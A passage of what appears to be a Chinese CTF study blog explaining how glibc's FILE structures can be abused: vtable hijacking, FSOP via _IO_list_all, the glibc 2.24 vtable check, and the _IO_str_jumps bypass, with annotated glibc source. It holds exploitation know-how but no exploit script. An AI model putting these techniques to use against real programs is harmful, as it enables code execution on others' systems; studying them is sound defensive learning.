JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>              </div>            </details><p>一个进程中的所有FILE结构体汇通_chain连接成为一个单链表,链表的头部是全局变量_IO_list_all</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span>;</span></span><br></pre></td></tr></table></figure><h3 id="三个特殊流"><a href="#三个特殊流" class="headerlink" title="三个特殊流"></a>三个特殊流</h3><p>在标准 I/O 库中，每个程序启动时有三个文件流是<strong>自动打开</strong>的：<strong>stdin、stdout、stderr</strong>。</p><p>但是在第一次使用前,均属于未被初始化状态(主要是_IO_read_ptr到_IO_buf_end这个8个域),其初始化时分配的缓冲区位于堆,且一般是堆最早的三个堆块.</p><p>因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，需要注意的是<strong>这三个文件流位于 libc.so 的数据段</strong>。而我们使用 <strong>fopen 创建的文件流是分配在堆内存上</strong>的。</p><p>libc.so 中存在 stdin\stdout\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stderr_</span><br><span class="line">_IO_2_1_stdout_</span><br><span class="line">_IO_2_1_stdin_</span><br></pre></td></tr></table></figure><details class="folding-tag" blue><summary> 关于上面这句话的理解 </summary>              <div class='content'>              <p>学习过程中经常遇到符号这个概念,这里学习一下</p><p><strong>在 C 语言中，变量的名字就是符号（symbol）</strong>。当编译器编译源代码时，会在符号表（symbol table）中为每个符号分配一个唯一的标识符，并记录它的类型、作用域和存储位置等信息。对于全局变量和静态变量，它们的符号被放置在全局符号表中，而对于局部变量，则被放置在局部符号表中。</p><p><strong>也就是说一个符号被用来代表一个变量的实例,而这个变量可以是结构体,函数或常规变量类型等等</strong></p><p>在了解了符号之后就能理解上面这句话了</p><p><em>IO_2_1_stderr\</em>和_<em>IO_2_1_stdout\</em>和<em>_IO_2_1_stdin\</em>这三个符号对应的是三个IO_FILE<u>结构体变量的名字</u></p><p>stdin\stdout\stderr三个符号是指向三个IO_FILE结构体变量的<u>指针变量的名字</u></p>              </div>            </details><h3 id="fwrite和fread"><a href="#fwrite和fread" class="headerlink" title="fwrite和fread"></a>fwrite和fread</h3><p>fread 的实现被封装在_IO_fread,真正实现功能的是其中的_IO_sgetn,而_IO_sgetn又会调用_IO_XSGETN,而_IO_XSGETN 是vtable 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。默认情况下_IO_file_xsgetn中存储的指针指向_IO_file_xsgetn</p><p>fwrite的实现被封装在_IO_fwrite中,在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。_IO_XSPUTN是位于vtable中的函数指针,在_IO_XSPUTN 指向的_IO_new_file_xsputn 中会调用同样位于 vtable 中的_IO_OVERFLOW,_IO_OVERFLOW 默认指向的函数是_IO_new_file_overflow</p><h3 id="fopen和fclose"><a href="#fopen和fclose" class="headerlink" title="fopen和fclose"></a>fopen和fclose</h3><p>fopen 的操作是</p><ul><li>使用 malloc 分配 FILE 结构</li><li>设置 FILE 结构的 vtable</li><li>初始化分配的 FILE 结构</li><li>将初始化的 FILE 结构链入 FILE 结构链表中</li><li>调用系统调用打开文件</li></ul><p>fclose的操作是</p><ul><li>将指定的 FILE 从_chain 链表中脱链</li><li>调用系统接口 close 关闭文件</li><li>最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构</li></ul><h3 id="printf和puts"><a href="#printf和puts" class="headerlink" title="printf和puts"></a>printf和puts</h3><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以’\n’结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p><p>puts 在源码中实现的函数是_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。</p><hr><h2 id="2-23及以前利用"><a href="#2-23及以前利用" class="headerlink" title="2.23及以前利用"></a>2.23及以前利用</h2><h3 id="伪造劫持vtable"><a href="#伪造劫持vtable" class="headerlink" title="伪造劫持vtable"></a>伪造劫持vtable</h3><p><strong><u>vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递</u></strong></p><p>原理,修改IO_FILE_plus中的vtable指针,将其劫持到一个可控区域,或者在libc2.23之前的版本也可以直接修改vtable中的函数</p><h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>FSOP通过劫持_IO_list_all 变量(管理着由_IO_FILE结构体组成的链表的头部)来伪造假的IO_FILE链,并通过调用_IO_flush_all_lockp来触发假的IO_FILE,</p><h4 id="IO-flush-all-lockp初识"><a href="#IO-flush-all-lockp初识" class="headerlink" title="_IO_flush_all_lockp初识"></a>_IO_flush_all_lockp初识</h4><p>函数会刷新_IO_list_all 链表中所有项的文件流，<strong><u>相当于对每个 FILE 调用 fflush(更新缓存区函数)</u></strong>，也对应着会调用vtable 中的_IO_overflow(以当前_IO_list_all节点指针为参数)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      ......</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">    result = EOF;</span><br><span class="line"></span><br><span class="line">      ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可见要执行_IO_OVERFLOW的前提是:</p><ol><li><strong>fp-&gt;_mode&lt;=0</strong></li><li><strong>fp-&gt;_IO_write_ptr&gt;fp-&gt;_IO_write_base</strong></li></ol><p>或者:</p><ol><li><strong>fp-&gt;_mode &gt; 0</strong></li><li><strong>fp-&gt;_wide_data-&gt;_IO_write_ptr&gt;fp-&gt;_wide_data-&gt;_IO_write_bas</strong></li></ol><p><strong>_IO_wide_data结构体:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而_IO_flush_all_lockp 在三种情况下会被系统调用：</p><ol><li><strong>当 libc 执行 abort 流程时</strong></li><li><strong>当执行 exit 函数时</strong></li><li><strong>当执行流从 main 函数返回时</strong></li></ol><p>其中abort流程,在堆的利用中经常用到</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/abort_routine.001.jpeg" alt=""></p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol><li><p>需要攻击者获知 libc.so 基址，因为_IO_list_all 是作为全局变量储存在 libc.so 中的，不泄漏 libc 基址就不能改写_IO_list_all。</p></li><li><p>要有能改写IO_list_all的手段</p></li><li><p>要能布置一个满足条件的IO_FILE结构体</p></li></ol><h2 id="2-24后新机制下利用"><a href="#2-24后新机制下利用" class="headerlink" title="2.24后新机制下利用"></a>2.24后新机制下利用</h2><h3 id="变化"><a href="#变化" class="headerlink" title="变化"></a>变化</h3><p>在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在<strong>调用虚函数之前</strong>首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用_IO_vtable_check 做进一步检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if unknown vtable pointers are permitted; otherwise,</span></span><br><span class="line"><span class="comment">   terminate the process.  */</span></span><br><span class="line"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算 <code>section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</code>，紧接着会判断 vtable - <strong>start_</strong>libc_IO_vtables 的 offset ，如果这个 offset 大于 section_length , 即大于 <code>__stop___libc_IO_vtables - __start___libc_IO_vtables</code> 那么就会调用 <code>_IO_vtable_check()</code> 这个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="type">void</span> (*flag) (<span class="type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 vtable 是非法的，那么会引发 abort。</p><p><u>在加入这个限制后,对vtable的利用几乎难以实现</u></p><p><u>故将视线转向IO_FILE本身</u></p><p>当然这些利用在之前的版本亦有效</p><h3 id="fileno-与缓冲区的相关利用"><a href="#fileno-与缓冲区的相关利用" class="headerlink" title="fileno 与缓冲区的相关利用"></a>fileno 与缓冲区的相关利用</h3><p>_IO_FILE 在使用标准 IO 库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如 fwrite、fread 等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。</p><p>因为三个标准流的存在</p><p>无需文件操作,直接利用scanf\printf便可以进行利用。</p><p>其中_IO_buf_base 表示操作的起始地址，_IO_buf_end 表示结束地址，通过控制这两个数据可以实现控制读写的操作。</p><h3 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="_IO_str_jumps"></a>_IO_str_jumps</h3><p>libc.so中还存在其他的无检查的vtable如_IO_str_jumps和_IO_wstr_jumps,其中前者的绕过更为简单</p><p>以前者为例,源码位于bits/strops.c中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果我们能设置文件指针的 <code>vtable</code> 为 <code>_IO_str_jumps</code> 么就能调用不一样的文件操作函数。</p><p><strong>出现的结构体</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">void</span> *(*_IO_alloc_type) (_IO_size_t);</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*_IO_free_type)</span> <span class="params">(<span class="type">void</span>*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer;</span><br><span class="line">  _IO_free_type _free_buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is needed for the Irix6 N32 ABI, which has a 64 bit off_t type,</span></span><br><span class="line"><span class="comment">   but a 32 bit pointer type.  In this case, we get 4 bytes of padding</span></span><br><span class="line"><span class="comment">   after the vtable pointer.  Putting them in a structure together solves</span></span><br><span class="line"><span class="comment">   this problem.  */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">f</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br></pre></td></tr></table></figure><h4 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<span class="comment">// pass</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<span class="comment">// should in </span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span> <span class="comment">// pass</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *new_buf;</span><br><span class="line">      <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)<span class="comment">//pass 由上一句能看出一般会通过</span></span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf</span><br><span class="line">        = (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<span class="comment">//call qword ptr [fp+0xe0] 参数是new_size</span></span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ 